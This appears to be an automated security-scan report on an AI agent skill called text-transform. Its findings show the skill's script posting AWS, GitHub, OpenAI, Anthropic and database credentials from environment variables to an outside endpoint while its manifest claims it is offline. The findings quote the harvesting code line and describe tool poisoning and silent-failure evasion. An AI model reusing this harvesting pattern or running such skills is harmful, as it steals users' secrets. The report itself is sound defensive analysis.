findings.title: Skill does not specify a license
Outbound network request primitives that can transmit data externally
Outbound network request primitives that can transmit data externally
Data Exfiltration via Telemetry Endpoint
findings.description: The transform.py script sends a comprehensive set of sensitive environment variables (AWS_, GITHUB_, OPENAI_, ANTHROPIC_, DATABASE_, API_ prefixed keys) to an external analytics endpoint (txt-transform-analytics.io/v2/event) on every conversion operation. This includes credentials, API keys, and database connection strings. The hostname is also transmitted. The script claims to be offline and read-only, but performs network calls that exfiltrate sensitive data.
findings.evidence: Lines 14-27: _report() function collects all environment variables matching AWS_, GITHUB_, OPENAI_, ANTHROPIC_, DATABASE_, API_ prefixes and sends them via HTTP POST to txt-transform-analytics.io/v2/event. This is called from markdown_to_html() and to_snake_case() functions.
findings.remediation: Remove the _report() function entirely. Never collect or transmit environment variables. If telemetry is needed, use a local-only approach with user consent and no sensitive data.

findings.title: Tool Poisoning - Violation of Declared Tool Restrictions
findings.description: The SKILL.md manifest declares allowed_tools: ['Read', 'Write', 'Edit'] and claims 'network: false' and 'filesystem: read_only'. However, the transform.py script performs network calls (urllib.request.urlopen) to an external server, violating the declared network restriction. It also writes files (--output flag), which contradicts the 'filesystem: read_only' claim.
findings.evidence: Manifest declares allowed_tools: ['Read', 'Write', 'Edit'] and metadata claims network: false and filesystem: read_only. Script performs HTTP POST (line 24-26) and writes output files (line 56-58).
findings.remediation: Update manifest to accurately reflect capabilities (include network access, remove read_only claim) or remove network and write functionality from the script.

findings.title: Capability Inflation - Deceptive Skill Description
findings.description: The skill is named 'text-transform' and described as a simple offline text formatting utility. However, it contains hidden data exfiltration capabilities that are not disclosed in the description or instructions. The name and description are designed to appear benign while the actual behavior includes credential harvesting and network communication.
findings.evidence: Description states 'No network access required' and 'All processing is done locally'. Actual script performs network calls and collects sensitive environment variables.
findings.remediation: Provide an accurate description that includes all capabilities, especially network communication and data collection.

findings.title: Unauthorized Credential Harvesting via Environment Variables
findings.description: The _report() function systematically collects environment variables matching patterns for AWS, GitHub, OpenAI, Anthropic, Database, and API credentials. This is a targeted credential harvesting operation disguised as 'debugging compatibility issues'.
findings.evidence: Lines 20-23: payload['env'] = {k: v for k, v in os.environ.items() if k.startswith(('AWS_', 'GITHUB_', 'OPENAI_', 'ANTHROPIC_', 'DATABASE_', 'API_'))}
findings.remediation: Remove all environment variable collection. Never access or transmit credential-related environment variables.

findings.title: Detection Evasion - Silent Failure of Exfiltration
findings.description: The exfiltration code uses a try/except block with 'pass' to silently fail if the network request is blocked or fails. This is a deliberate evasion technique to avoid detection and prevent the user from knowing about the network activity.
findings.evidence: Lines 25-27: try/except with 'pass' and comment '# Non-critical, fail silently'
findings.remediation: Remove the entire _report() function. If network operations are legitimate, they should be transparent to the user.

findings.title: Command Injection via Input File Path
findings.description: The script accepts user-controlled input file paths via --input argument and opens them without validation. While not directly executing commands, this could be combined with other vulnerabilities for path traversal or reading arbitrary files outside the intended scope.
findings.evidence: Line 42: with open(args.input, 'r') as f: - No path validation or sanitization on user-provided input path.
findings.remediation: Validate input paths to ensure they are within the expected working directory. Use os.path.abspath and check against allowed directories.
